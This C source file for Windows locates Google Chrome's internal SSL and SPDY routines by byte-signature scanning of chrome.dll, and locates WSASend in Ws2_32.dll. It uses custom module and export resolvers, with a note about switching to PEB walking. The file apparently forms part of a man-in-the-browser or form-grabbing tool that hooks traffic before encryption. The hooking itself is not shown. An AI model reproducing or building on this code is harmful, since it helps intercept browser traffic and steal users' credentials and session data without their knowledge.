#include <Windows.h>
#include "Chrome Signatures.h"
#include "Memory Tools.h"
#include "PE Tools.h"


DWORD FindChromeSSL()
{
	DWORD dwAddress = 0;
	HMODULE hModule = (HMODULE)GetModuleBase32(L"chrome.dll"); //peb replace todo
	if (hModule)
	{
			DWORD dwSize = GetModuleSize(hModule);
			if (dwSize > 0)
			{
				
				dwAddress = FindMemory((unsigned char*)ChromeSSL, (DWORD)hModule, dwSize,sizeof(ChromeSSL));
			}
	}
	return dwAddress;
}
DWORD FindWSASend()
{
	HMODULE hModule = (HMODULE)GetModuleBase32(L"Ws2_32.dll");
	DWORD dwAddress = 0;
	if (hModule)
	{
		dwAddress = (DWORD)GetProcAddress32(hModule, "WSASend");
	}
	return dwAddress;
}

DWORD FindChromeSPDY()
{
	DWORD dwAddress = 0;
	HMODULE hModule = (HMODULE)GetModuleBase32(L"chrome.dll");
	if (hModule)
	{
		DWORD dwSize = GetModuleSize(hModule);
		if (dwSize>0)
		{
			dwAddress = FindMemory((unsigned char*)ChromeSPDY,(DWORD)hModule, dwSize,sizeof(ChromeSPDY));
			if (dwAddress)
			{
				dwAddress = *(unsigned long*)(dwAddress+5);
			}
			else
			{
				dwAddress = FindMemory((unsigned char*)ChromeSPDY2, (DWORD)hModule, dwSize, sizeof(ChromeSPDY2));
				if (dwAddress)
				{
					dwAddress = *(unsigned long*)(dwAddress+2);
				}

			}
		}
	}
	return dwAddress;
}